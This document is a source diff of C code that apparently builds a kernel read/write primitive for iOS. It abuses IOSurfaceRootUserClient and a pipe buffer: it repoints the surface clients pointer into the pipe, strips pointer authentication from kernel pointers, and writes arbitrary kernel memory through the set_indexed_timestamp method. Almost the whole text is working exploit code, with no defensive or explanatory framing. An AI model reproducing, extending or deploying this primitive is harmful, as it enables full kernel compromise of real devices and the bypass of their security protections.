@@ -90,6 +90,7 @@ uint32_t IOSurface_id;
 mach_port_t IOSurface_worker_uc;
 uint32_t IOSurface_worker_id;
 uint64_t IOSurfaceRoot_uc;
+uint64_t original_surfaceclients;
 
 bool IOSurface_init(void) {
     IOSurfaceRoot = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
@@ -195,10 +196,9 @@ bool KernRW_init(uint64_t proc) {
     }
     kernrw_log("[*] Filling pipe...");
     pipe_buffer = (uint8_t*)malloc(pipe_buffer_size);
-//    while (write_pipe()) {} // Fill the pipe (hangs)
+    // We have to write to the pipe at least once for some reason
     write_pipe();
-    kernrw_log("[*] Reading once from pipe...");
-    read_pipe(); // Make space for another write
+    read_pipe();
     // Find the pipe base
     kernrw_log("[*] finding p_fd");
     uint64_t p_fd = UNPAC(read_64(proc + P_FD));
@@ -212,10 +212,11 @@ bool KernRW_init(uint64_t proc) {
     uint64_t rpipe = UNPAC(read_64(fp_glob + FG_DATA));
     kernrw_log("[*] finding pipe base");
     pipe_base = UNPAC(read_64(rpipe + 0x10));
-    // Move kernel's pipe buffer to overlap IOSurfaceRootUserClient
-    kernrw_log("[*] Moving pipe buffer...");
+    // Move IOSurfaceRootUserClient to point to the kernel's pipe buffer
+    kernrw_log("[*] Moving surface clients to pipe buffer...");
     uint8_t bytes[20];
     read_20(IOSurfaceRoot_uc + SURFACE_CLIENTS - 4, bytes);
+    original_surfaceclients = *(uint64_t*)(bytes + 4);
     *(uint64_t*)(bytes + 4) = pipe_base;
     write_20(IOSurfaceRoot_uc + SURFACE_CLIENTS - 4, bytes);
     return true;
@@ -279,7 +280,6 @@ void kwrite64(uint64_t addr, uint64_t val) {
         1, 0, // fixed
         val
     };
-//    uint32_t i_count = 3;
     if (IOConnectCallMethod(IOSurfaceRootUserClient,
                             33, // s_set_indexed_timestamp
                             i_scalar, 3,
@@ -312,10 +312,4 @@ void kwrite(uint64_t addr, void *data, size_t count) {
         kwrite64(addr + pos, val);
         pos += 8;
     }
-}
-
-void KernRW_deinit(void) {
-    close(pipefds[0]);
-    close(pipefds[1]);
-    IOSurface_deinit();
 }
